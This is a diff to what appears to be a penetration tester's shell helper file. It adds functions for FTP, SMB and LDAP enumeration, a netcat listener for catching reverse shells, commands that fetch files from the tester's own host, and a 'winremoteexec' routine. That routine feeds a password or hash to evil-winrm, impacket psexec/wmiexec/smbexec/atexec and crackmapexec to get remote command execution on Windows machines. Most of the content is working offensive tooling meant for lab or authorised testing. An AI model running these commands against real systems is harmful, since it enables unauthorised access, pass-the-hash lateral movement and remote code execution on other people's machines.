@@ -101,7 +101,8 @@ dcu() {
       echo "curl \"http://$address:$port/$f\" -outputfile $file_name"
       echo "wget http://$address:$port/$f -outputfile $file_name"
       echo "Invoke-WebRequest -Uri http://$address:$port/$f -OutFile '$file_name'"
-      printf 'Copy-Item -Source \\\\%s\\kali\\%s -Destination "%s"\n' "$address" "$f" "$file_name"
+      printf 'Copy-Item -Source \\\\%s:%s\\kali\\%s -Destination "%s"\n' "$address" "$port" "$f" "$file_name"
+      printf 'copy \\\\%s:%s\\kali\\%s %s\n' "$address" "$port" "$f" "$file_name"
       printf 'copy \\\\%s\\kali\\%s %s\n' "$address" "$f" "$file_name"
     fi
     if [ "$1" = "lin" ]; then
@@ -132,7 +133,7 @@ dcus() {
 ncl() {
   port="5555"
   [ "$1" != "" ] && port="$1"
-  [ "$2" = "w" ] && sudo rlwarp nc -nlvp "$port"
+  [ "$2" = "w" ] && sudo rlwrap nc -nlvp "$port"
   [ "$2" != "w" ] && sudo nc -nlvp "$port"
 }
 
@@ -416,8 +417,8 @@ enumerateftp() {
 	  lftp -e 'ls' -u {},'' ftp://$1:$2; \
 	  echo \"########### Running: lftp -e 'ls' -u {},{} ftp://$1:$2 ###########\"; \
 	  lftp -e 'ls' -u {},{} ftp://$1:$2"
-	echo "########### Running: 	sudo nmap --script \"ftp*\" -Pn -p \"$port\" \"$1\" ###########"
-	sudo nmap --script "ftp*" -Pn -p "$port" "$1"
+	echo "########### Running: sudo nmap -v --script \"ftp*\" -Pn -p \"$port\" \"$1\" ###########"
+	sudo nmap -v --script "ftp*" -Pn -p "$port" "$1"
 }
 
 enumftp() {
@@ -460,8 +461,8 @@ enumeratesmb() {
 	impacket-getArch -target "$1"
 	echo "########### Running: enum4linux-ng.py -a \"$1\" ###########"
 	enum4linux-ng.py -A "$1"
-	echo "########### Running: nmap --script \"smb-enum* or smb-vuln*\" -Pn -p 139,445 \"$1\" ###########"
-	sudo nmap --script "smb-enum* or smb-vuln*" -Pn -p 139,445 "$1"
+	echo "########### Running: nmap -v --script \"smb-enum* or smb-vuln*\" -Pn -p 139,445 \"$1\" ###########"
+	sudo nmap -v --script "smb-enum* or smb-vuln*" -Pn -p 139,445 "$1"
 	if [ ! "$2" = "" ]; then
 		echo "########### Running: impacket-GetADUsers -dc-ip \"$1\" \"$2/\" -all ###########"
 		impacket-GetADUsers -dc-ip "$1" "$2/" -all
@@ -522,4 +523,53 @@ pss() {
     echo "or with wildcard:"
     echo "nmap -Pn -v --script \""${split}-*"\" -p \"\$ports\" \"\$rhost\""
   fi
+}
+
+enumerateldap() {
+  [ "$1" = "" ] && echo "Usage: enumldap <ip> [port]" && return
+  port=389
+  [ ! "$2" = "" ] && port="$2"
+  nmap -n -sV -v --script "ldap* and not brute" -p "$port" "$1"
+  echo "Running ldap nmap scan in background..."
+  nmap_output="$(nmap -n -sV -v --script "ldap* and not brute" -p "$port" "$1")"
+  root_tree="$(echo "$nmap_output" | grep rootDomainNamingContext | cut -d ":" -f 2 | sed 's/^ //')"
+  echo ""
+  echo "Running ldapsearch in root_tree: $root_tree"
+  echo "ldapsearch -x -H ldap://$1:$port -b \"$root_tree\" '*'"
+  ldapsearch -x -H ldap://$1:$port -b "$root_tree" '*'
+  crackmapexec ldap "$1" -u '' -p ''
+}
+
+# ENUMerate ldap
+enumldap() {
+  enumerateldap "$@" | tee enumldap.txt
+}
+
+# windows remote execution
+winremoteexec() {
+  [ "$4" = "" ] && echo "Usage: winremoteexec <pw,hash> <ip> <user> <pw or hash> [domain]" && return
+  ip="$2"
+  user="$3"
+  pw_ha="$4"
+  domain="$5"
+  crackmapexec smb "$ip" -u "$user" -p "$pw_ha" --shares
+  echo "whoami" | evil-winrm -i "$ip" -u "$domain\\$user" -p "$pw_ha"
+  echo "whoami" | impacket-smbexec "$domain/$user:$pw_ha@$ip"
+  impacket-psexec "$domain/$user:$pw_ha@$ip" whoami
+  impacket-wmiexec "$domain/$user:$pw_ha@$ip" whoami
+  impacket-atexec "$domain/$user:$pw_ha@$ip" whoami
+  impacket-dcomexec "$domain/$user:$pw_ha@$ip" whoami
+
+  crackmapexec smb "$ip" -u "$user" -p $pw_ha -x whoami
+  crackmapexec smb --exec-method smbexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+  crackmapexec smb --exec-method wmiexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+  crackmapexec smb --exec-method atexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+  crackmapexec smb --exec-method mmcexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+
+  crackmapexec winrm "$ip" -u "$user" -p "$pw_ha" -x whoami
+
+  echo "Also try the following commands if ports are open:"
+  echo ""
+  echo "crackmapexec ssh \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
+  echo "crackmapexec mssql \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
 }
